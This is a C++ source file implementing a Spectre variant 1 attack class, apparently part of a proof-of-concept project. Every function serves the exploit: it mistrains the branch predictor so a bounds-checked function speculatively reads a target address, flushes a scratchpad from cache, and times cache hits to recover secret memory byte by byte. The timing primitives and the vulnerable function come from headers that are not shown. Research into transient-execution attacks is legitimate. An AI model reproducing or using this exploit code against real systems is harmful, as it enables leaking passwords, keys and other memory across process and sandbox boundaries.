//
// Created by sage on 1/13/21.
//

#include <stdafx.h>
#include <Spectrev1.h>
#include <cacheutils.h>

volatile void Spectrev1::read( void volatile * const p_secret, size_t n_bytes, uint8_t *p_buf)
{
    for(auto i = 0; i < n_bytes; ++i)
    {
        read_byte(CVMEM_ADD(p_secret,i), &p_buf[i]);
    }
}

volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_val)
{
    // Need to make sure every page of p_scratchpad is backed
    for (auto i = 0; i < block_len*MAX_BYTE; i += cachelinesize)
    {
        p_scratchpad[i] = 1;
    }

    memset(results, 0 , sizeof(results));

    volatile size_t mal_x = (reinterpret_cast<const volatile uint8_t*>(p_secret) - p_base);

    for (auto tries = n_max_tries; tries > 0; --tries)
    {
        do_attack(fn_get_trainx(tries), mal_x);

        if ( (results[high] == 2 && results[high2] == 0) || (results[high] >= (2*results[high2] + n_trainings)) )
        {
            break;
        }

    }
    *p_val = high;
}

inline void Spectrev1::do_attack(size_t train_x, size_t mal_x)
{
    // Flush every cache line in p_scratchpad
    for (volatile auto i = 0; i < MAX_BYTE*block_len; i += cachelinesize)
    {
        flush(&p_scratchpad[i]);
    }

    mistrain(train_x, mal_x);
    find_hits(train_x);
}

inline void Spectrev1::mistrain(size_t train_x, size_t mal_x)
{
    volatile uint64_t x;
    for (int i = (n_trainings*(n_trainings+1))-1; i >= 0; --i)
    {
        // Set x to mal_x when i % (n_trainings+1) == 0
        x = (i % (n_trainings+1));
        x = (x-1)/(x+1);
        x = train_x ^ (x & (mal_x ^ train_x));

        fn_vuln(x);
    }
}

inline void Spectrev1::find_hits(size_t train_x)
{
    high = high2 = -1;
    int mix_i, i;
    for (i = 0; i < MAX_BYTE; ++i)
    {
        mix_i = MIX(i);
        if ( is_hit(load(&p_scratchpad[mix_i*block_len])) && mix_i != p_base[train_x] )
        {
            ++results[mix_i];
        }
    }

    // Find the two highest scores
    for (i = 0; i < MAX_BYTE; ++i)
    {
        if (high < 0 || results[i] >= results[high])
        {
            high2 = high;
            high = i;
        }
        else if (high2 < 0 || results[i] >= results[high2])
        {
            high2 = i;
        }
    }
}
